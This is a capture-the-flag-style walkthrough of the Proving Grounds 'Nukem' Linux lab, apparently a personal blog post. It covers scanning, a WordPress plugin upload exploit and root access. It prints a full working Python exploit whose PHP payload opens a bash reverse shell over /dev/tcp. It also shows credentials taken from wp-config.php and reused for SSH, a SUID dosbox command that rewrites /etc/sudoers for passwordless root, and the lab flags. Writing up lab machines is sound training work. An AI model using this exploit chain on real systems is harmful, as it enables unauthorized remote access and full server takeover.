---
title: Proving Grounds Practice — Nukem          
date: 2025-06-26 00:00:00 +0800      
categories: [proving gounds]          
tags: [proving gounds]         
toc: true                           
comments: false                    
math: false                          
mermaid: false                       
---
- **OS**: Linux
- **Difficulty**: Intermediate

## Service Enumeration

**Port Scan Results**

**TCP**: 22, 80, 3306, 5000, 13000, 36445

We run nmapAutomator to scan the target and found a few ports open.

> [nmapAutomator - GitHub](https://github.com/21y4d/nmapAutomator)

```
└─$ cat nmapAutomator_192.168.160.105_All.txt 

Running all scans on 192.168.160.105

Host is likely running Unknown OS!
                                                                                                                                                           
                                                                                                                                                           
---------------------Starting Port Scan-----------------------


PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
5000/tcp open  upnp



---------------------Starting Script Scan-----------------------


PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
80/tcp   open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
|_http-title: Retro Gamming &#8211; Just another WordPress site
3306/tcp open  mysql   MariaDB 10.3.24 or later (unauthorized)
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5



---------------------Starting Full Scan------------------------


PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
5000/tcp  open  upnp
13000/tcp open  unknown
36445/tcp open  unknown



Making a script scan on extra ports: 13000, 36445


PORT      STATE SERVICE     VERSION
13000/tcp open  http        nginx 1.18.0
|_http-title: Login V14
|_http-server-header: nginx/1.18.0
36445/tcp open  netbios-ssn Samba smbd 4
```

## Initial Access — Outdated wordpress plugin to RCE

Nmap scan result showed that port 80 uses wordpress, so we used wpscan

```
wpscan --url http://192.168.160.105/ --enumerate vt,vp,tt,cb,dbe,u --verbose
```

![image-20260211032404343](assets/img/image-20260211032404343.png)

The version of simple-file-list plugin seems to be outdated and vulnerable to unauthenticated RCE.

![image-20260211032409871](assets/img/image-20260211032409871.png)

We found an exploits at ExploitDB

> [WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload](https://www.exploit-db.com/exploits/48979)

Download the exploits and change port our reverse shell local host and local port.

```
searchsploit -m 48979
```

![image-20260211032414480](assets/img/image-20260211032414480.png)

![image-20260211032418086](assets/img/image-20260211032418086.png)

Changed exploits

```python
import requests
import random
import hashlib
import sys
import os
import urllib3
urllib3.disable_warnings()

dir_path = '/wp-content/uploads/simple-file-list/'
upload_path = '/wp-content/plugins/simple-file-list/ee-upload-engine.php'
move_path = '/wp-content/plugins/simple-file-list/ee-file-engine.php'

def usage():
    banner = """
NAME: Wordpress v5.4 Simple File List v4.2.2, pre-auth RCE
SYNOPSIS: python wp_simple_file_list_4.2.2.py <URL>
AUTHOR: coiffeur
    """
    print(banner)

def generate():
    filename = f'{random.randint(0, 10000)}.png'
    password = hashlib.md5(bytearray(random.getrandbits(8)
                                     for _ in range(20))).hexdigest()
    with open(f'{filename}', 'wb') as f:
# change here
        payload = '<?php passthru("bash -i >& /dev/tcp/192.168.160.105/80 0>&1"); ?>'
        f.write(payload.encode())
    print(f'[ ] File {filename} generated with password: {password}')
    return filename, password

def upload(url, filename):
    files = {'file': (filename, open(filename, 'rb'), 'image/png')}
    datas = {'eeSFL_ID': 1, 'eeSFL_FileUploadDir': dir_path,
             'eeSFL_Timestamp': 1587258885, 'eeSFL_Token': 'ba288252629a5399759b6fde1e205bc2'}
    r = requests.post(url=f'{url}{upload_path}',
                      data=datas, files=files, verify=False)
    r = requests.get(url=f'{url}{dir_path}{filename}', verify=False)
    if r.status_code == 200:
        print(f'[ ] File uploaded at {url}{dir_path}{filename}')
        os.remove(filename)
    else:
        print(f'[*] Failed to upload {filename}')
        exit(-1)
    return filename

def move(url, filename):
    new_filename = f'{filename.split(".")[0]}.php'
    headers = {'Referer': f'{url}/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1',
               'X-Requested-With': 'XMLHttpRequest'}
    datas = {'eeSFL_ID': 1, 'eeFileOld': filename,
             'eeListFolder': '/', 'eeFileAction': f'Rename|{new_filename}'}
    r = requests.post(url=f'{url}{move_path}',
                      data=datas, headers=headers, verify=False)
    if r.status_code == 200:
        print(f'[ ] File moved to {url}{dir_path}{new_filename}')
    else:
        print(f'[*] Failed to move {filename}')
        exit(-1)
    return new_filename

def main(url):
    file_to_upload, password = generate()
    uploaded_file = upload(url, file_to_upload)
    moved_file = move(url, uploaded_file)
    if moved_file:
        print(f'[+] Exploit seem to work.\n[*] Confirmning ...')
    datas = {'password': password, 'cmd': 'phpinfo();'}
    r = requests.post(url=f'{url}{dir_path}{moved_file}',
                      data=datas, verify=False)
    if r.status_code == 200 and r.text.find('php') != -1:
        print('[+] Exploit work !')
        print(f'\tURL: {url}{dir_path}{moved_file}')
        print(f'\tPassword: {password}')

if __name__ == "__main__":
    if (len(sys.argv) < 2):
        usage()
        exit(-1)
    main(sys.argv[1])
```

Launched the exploits and get reverse shell at port 80.

```
python3 48979.py http://192.168.160.105
nc -lvnp 80
```

![image-20260211032424716](assets/img/image-20260211032424716.png)

Upgrade shell to fully interactive ttys.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20260211032428129](assets/img/image-20260211032428129.png)

**local.txt value:** 80c29b1e0d0365ad2a0007cea8b77552

```bash
find / -type f -name local.txt 2>/dev/null
whoami && cat /home/commander/local.txt && ifconfig
```

![image-20260211032431469](assets/img/image-20260211032431469.png)

## Privilege Escalation — dosbox suid write sudoers file

We get database credentials **commander:CommanderKeenVorticons1990** at /srv/http/wp-config.php

```bash
cat wp-config.php
```

![image-20260211032434765](assets/img/image-20260211032434765.png)

![image-20260211032440481](assets/img/image-20260211032440481.png)

We guess mysql and ssh use same credentials, and successfully login.

```bash
ssh commander@192.168.117.105
```

![image-20260211032627176](assets/img/image-20260211032627176.png)

Here is an interesting binary dosbox with suid bit set.

```
find / -perm -u=s -type f 2>/dev/null
```

![image-20260211032631687](assets/img/image-20260211032631687.png)

GTFOBins revealed a known technique for write file when the SUID bit is set to dosbox.

> [dosbox | GTFOBins](https://gtfobins.github.io/gtfobins/dosbox/#suid)

![gtfobins](https://cdn-images-1.medium.com/max/800/1*VdzKZRvD8cAN8q92sDmQ4w.png)

We add an entry to /etc/sudoers that allow any user, connected from any host, to run any command as root, without needing to enter a password.

Then use sudo su to get root shell without password.

```bash
dosbox -c 'mount c /' -c "echo ALL ALL=(ALL) NOPASSWD:ALL >c:/etc/sudoers" -c exit
```

![image-20260211032636264](assets/img/image-20260211032636264.png)

## Post Exploitation

**proof.txt value:** 1bd80ca1ce7bb501536aa4adcc69dd69

```bash
whoami && cat /root/proof.txt && ifconfig
```

![image-20260211032639210](assets/img/image-20260211032639210.png)
